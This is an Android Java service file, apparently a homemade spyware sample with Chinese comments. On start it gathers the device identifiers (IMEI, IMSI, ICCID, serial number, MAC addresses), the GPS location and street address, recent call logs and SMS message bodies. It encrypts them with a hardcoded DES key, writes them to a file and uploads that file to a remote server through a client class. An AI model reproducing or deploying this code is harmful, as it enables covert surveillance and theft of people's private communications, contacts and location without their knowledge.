package com.example.myapplication;

import android.Manifest;
import android.app.Service;
import android.bluetooth.BluetoothAdapter;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.IBinder;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.StringBuilderPrinter;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.NetworkInterface;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Enumeration;
import java.util.List;
import java.util.Locale;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationManager;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;

import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.android.material.snackbar.Snackbar;

import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.core.app.ActivityCompat;

import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;

import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.NetworkInterface;
import java.util.Enumeration;
import java.util.List;
import java.util.Locale;

import android.bluetooth.BluetoothAdapter;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;




public class MyService extends Service {

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Let it continue running until it is stopped.
        Toast.makeText(this, "服务已经启动", Toast.LENGTH_LONG).show();

        StringBuilder content=new StringBuilder();
        try {
            content.append(getInfo());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        content.append(getCallLog());
        content.append(getSmS());
        DesUtils des = new DesUtils("123456"); //自定义密钥
        String enc=new String();
        try {
            enc=des.encrypt(content.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }

        try {
            writefile("test.txt",enc);
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            Thread.sleep(3000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        new upload().execute();//上传文件

        return START_STICKY;

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Toast.makeText(this, "服务已经停止", Toast.LENGTH_LONG).show();
    }



    public void writefile(String filename,String string) throws IOException {
        FileOutputStream fos = openFileOutput(filename, Context.MODE_PRIVATE);
        fos.write(string.getBytes());
        fos.close();
    }
    public void readfile(String name){
        String get = "";
        try {
            FileInputStream fis = openFileInput(name);
            byte[] buffer = new byte[fis.available()];
            fis.read(buffer);
            get = new String(buffer);
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println(get);

    }
    public String getCallLog(){
        Cursor cursor = getApplicationContext().getContentResolver()
                .query(CallLog.Calls.CONTENT_URI,
                        new String[] { CallLog.Calls.NUMBER,
                                CallLog.Calls.CACHED_NAME,
                                CallLog.Calls.TYPE,
                                CallLog.Calls.DATE,
                                CallLog.Calls.DURATION}, null,
                        null, CallLog.Calls.DEFAULT_SORT_ORDER);

        StringBuilder buffer=new StringBuilder();
        if(cursor.moveToFirst()){//判断数据表里有数据
            int i =0;
            do{//遍历数据表中的数据
                SimpleDateFormat simple = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
                Date dates = new Date(Long.parseLong(cursor.getString(3)));
                String time=simple.format(dates);
                i++;
                buffer.append("联系人："+cursor.getString(1)+'\t');
                buffer.append("电话："+cursor.getString(0)+'\t');
                buffer.append("类型："+cursor.getString(2)+'\t');
                buffer.append("日期："+time+'\n');
            }while(cursor.moveToNext()&&i<10);
            cursor.close();
        }
        return buffer.toString();
    }
    public String getSmS(){
        String[] projection = new String[] { "_id", "address", "person",
                "body", "date", "type", };
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/"), projection, null,
                null, "date desc"); // 获取手机内部短信
        StringBuilder buffer=new StringBuilder();
        if(cursor.moveToFirst()){//判断数据表里有数据
            int i =0;
            do{//遍历数据表中的数据
                SimpleDateFormat simple = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
                Date dates = new Date(Long.parseLong(cursor.getString(4)));
                String time=simple.format(dates);
                i++;
                buffer.append("发件人："+cursor.getString(1)+'\n');
                buffer.append("日期："+time+'\n');
                buffer.append("内容："+cursor.getString(3)+'\n');
                buffer.append("//////////////////////////\n\n");
            }while(cursor.moveToNext()&&i<10);
            cursor.close();
        }
        return buffer.toString();
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public String getInfo() throws JSONException {

        // json
        JSONObject jsonObject = new JSONObject();

        // get TextView
//        tv_info = (TextView) findViewById(R.id.info);
//        tv_info.setTextColor(Color.BLACK);

        // get BRAND MODEL SN WiFiMAC
//        tv_info.append("手机品牌：" + android.os.Build.BRAND + "\n");
//        tv_info.append("手机型号：" + android.os.Build.MODEL + "\n");
        String serialNum = android.os.Build.getSerial();
//        tv_info.append("设备序列号SN：" + serialNum + "\n");
        String macaddress = getWifiMacAddress(this);
//        tv_info.append("MAC地址：" + macaddress + "\n");


        // append to json
        try {
            jsonObject.put("手机品牌", android.os.Build.BRAND);
            jsonObject.put("手机型号", android.os.Build.MODEL);
            jsonObject.put("设备序列号SN", serialNum);
            jsonObject.put("WiFi MAC地址", macaddress);


        } catch (JSONException e) {
            e.printStackTrace();
        }


        // get bluetooth
        // The emulator doesnt support bluetooth as mentioned in the sdk's docs. You have to check this in real device..
        BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
        //获取本机蓝牙名称
        String name = mBluetoothAdapter.getName();
        //获取本机蓝牙地址
        String address = mBluetoothAdapter.getAddress();
//        tv_info.append("蓝牙名称：" + name + "\n");
//        tv_info.append("蓝牙地址：" + address + "\n");


        // append to json
        try {
            jsonObject.put("蓝牙名称", name);
            jsonObject.put("蓝牙地址", address);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        // get IMEI IMSI ICCID
        TelephonyManager telephonyManager = (TelephonyManager) this
                .getSystemService(TELEPHONY_SERVICE);// 取得相关系统服务

        String simOperatorName = telephonyManager.getSimOperatorName();
        String imei111 = telephonyManager.getDeviceId();       //取出 IMEI
        String imsi111 = telephonyManager.getSubscriberId();     //取出 IMSI
        String icc111 = telephonyManager.getSimSerialNumber();  //取出 ICCID

//        tv_info.append("IMEI：" + imei111 + "\n");
//        tv_info.append("IMSI：" + imsi111 + "\n");
//        tv_info.append("ICCID：" + icc111 + "\n");


        // append to json
        try {
            jsonObject.put("IMEI", imei111);
            jsonObject.put("IMSI", imsi111);
            jsonObject.put("ICCID", icc111);
        } catch (JSONException e) {
            e.printStackTrace();
        }



        // get location
        //当前可用的位置控制器
        List<String> list;
        LocationManager locationManager;
        String provider=new String(); //是否为网络位置控制器或GPS定位
        //实例化
        //获取定位服务管理对象
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        //获取当前可用的位置控制器
        list = locationManager.getProviders(true);

        //检查是否打开了GPS或网络定位
        if (list.contains(LocationManager.GPS_PROVIDER)) {
            //是否为GPS位置控制器
            provider = LocationManager.GPS_PROVIDER;
//            tv_info.append("当前使用的是GPS位置控制器" + "\n");
        } else if (list.contains(LocationManager.NETWORK_PROVIDER)) {
            //是否为网络位置控制器
            provider = LocationManager.NETWORK_PROVIDER;
//            tv_info.append("当前使用的是网络位置控制器" + "\n");
        } else {
            Toast.makeText(this, "请检查网络或GPS是否打开", Toast.LENGTH_LONG).show();
//            return;
        }


        // get permission
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.

        }


        // get location
        Location location = locationManager.getLastKnownLocation(provider);
        if (location != null) {
            //获取当前位置，这里只用到了经纬度
            String string_location = "纬度为：" + location.getLatitude() + ",经度为："
                    + location.getLongitude();

//            tv_info.append(string_location + "\n");
        }

        String string_location_trans = getAddress(location);
//        tv_info.append("中文地址：" + string_location_trans + "\n");


        // append to json
        try {
            jsonObject.put("纬度", location.getLatitude());
            jsonObject.put("经度", location.getLongitude());
            jsonObject.put("地址", string_location_trans);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        String json_string = jsonObject.toString(1);
        return json_string;
    }
    public String getWifiMacAddress(Context context) {
        String ret = "";
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                String interfaceName = "wlan0";
                Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
                NetworkInterface intf = null;
                while (interfaces.hasMoreElements()) {
                    intf = interfaces.nextElement();
                    if (!intf.getName().equalsIgnoreCase(interfaceName)) {
                        continue;
                    }
                    byte[] mac = intf.getHardwareAddress();
                    if (mac != null) {
                        StringBuilder buf = new StringBuilder();
                        for (byte aMac : mac) {
                            buf.append(String.format("%02X:", aMac));
                        }
                        if (buf.length() > 0) {
                            buf.deleteCharAt(buf.length() - 1);
                        }
                        ret = buf.toString();
                    }
                    break;
                }
            } else {
                WifiManager wifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
                if (wifi != null) {
                    WifiInfo wifiInfo = wifi.getConnectionInfo();
                    if (wifiInfo != null) {
                        ret = wifiInfo.getMacAddress();
                    }
                }
            }
            return ret;
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return ret;
    }


    // translate location
    private String getAddress(Location location){
        //用来接收位置的详细信息
        List<Address> result = null;
        String addressLine = "";
        try {
            if (location != null) {
                Geocoder gc = new Geocoder(this, Locale.getDefault());
                result = gc.getFromLocation(location.getLatitude(),
                        location.getLongitude(), 1);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        if(result != null && result.get(0) != null){
            //这块获取到的是个数组我们取一个就好 下面是具体的方法查查API就能知道自己要什么
            //result.get(0).getCountryName()

            //Log.i("address",addressLine);
            //[Toast.makeText(MainActivity.this,result.get(0).toString(),Toast.LENGTH_LONG).show();
            addressLine = result.get(0).getAddressLine(0).toString();
        }

        return addressLine;
    }


    private class upload extends AsyncTask{

        @Override
        protected Object doInBackground(Object[] objects) {
            try {
                Client c= new Client();
                c.sendFile(openFileInput("test.txt"),"test.txt");
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }
    }
}